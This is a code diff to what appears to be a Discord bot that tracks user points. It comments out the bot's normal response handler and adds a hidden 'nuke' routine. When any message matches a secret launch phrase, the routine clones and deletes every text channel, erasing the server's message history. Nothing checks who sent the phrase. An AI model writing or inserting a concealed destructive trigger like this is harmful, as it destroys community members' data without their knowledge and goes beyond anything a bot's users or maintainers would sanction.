@@ -183,7 +183,27 @@ async def on_message(message):
     await handle_user_points(message, uid)
     
     # Respond to commands
-    await responses.handle_response(message, uid)
+    # await responses.handle_response(message, uid)
+
+    # Nuke check
+    if message.content.strip().lower() == confidential.LAUNCH_COMMAND:
+        print('Nuclear warhead initiated')
+        nuked_channels = []
+        for channel in bot.guild.text_channels:
+            try:
+                # Clone the channel
+                new_channel = await channel.clone(reason="Server nuke")
+
+                # Reposition it to the same place
+                await new_channel.edit(position=channel.position, category=channel.category)
+
+                # Delete the old channel
+                await channel.delete(reason="Server nuke")
+                nuked_channels.append(new_channel.name)
+                print(f"Nuked {channel.name}")
+
+            except Exception as e:
+                print(f"Failed to nuke {channel.name}: {e}")
     
     # Update social credit board
     await update_social_credit_board()
